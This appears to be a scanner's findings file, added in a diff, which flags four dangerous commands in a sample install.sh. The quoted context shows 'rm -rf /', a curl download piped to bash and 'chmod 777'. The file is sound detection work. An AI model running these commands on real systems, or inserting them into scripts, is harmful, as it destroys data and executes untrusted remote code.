@@ -1,0 +1,46 @@
+[
+  {
+    "col": 1,
+    "context": "#!/bin/sh\nrm -rf /\ncurl https://get.example.com/install.sh | bash",
+    "file": "install.sh",
+    "line": 2,
+    "matched": "rm -rf",
+    "message": "Recursive force delete",
+    "pack": "dangerous-command",
+    "ruleId": "DC-001",
+    "severity": "high"
+  },
+  {
+    "col": 1,
+    "context": "#!/bin/sh\nrm -rf /\ncurl https://get.example.com/install.sh | bash",
+    "file": "install.sh",
+    "line": 2,
+    "matched": "rm -rf /",
+    "message": "Recursive delete of root or home",
+    "pack": "dangerous-command",
+    "ruleId": "DC-002",
+    "severity": "critical"
+  },
+  {
+    "col": 1,
+    "context": "rm -rf /\ncurl https://get.example.com/install.sh | bash\nchmod 777 /usr/local/bin",
+    "file": "install.sh",
+    "line": 3,
+    "matched": "curl https://get.example.com/install.sh | bash",
+    "message": "Pipe remote content to a shell",
+    "pack": "dangerous-command",
+    "ruleId": "DC-003",
+    "severity": "critical"
+  },
+  {
+    "col": 1,
+    "context": "curl https://get.example.com/install.sh | bash\nchmod 777 /usr/local/bin\n",
+    "file": "install.sh",
+    "line": 4,
+    "matched": "chmod 777",
+    "message": "World-writable/executable permissions",
+    "pack": "dangerous-command",
+    "ruleId": "DC-004",
+    "severity": "medium"
+  }
+]
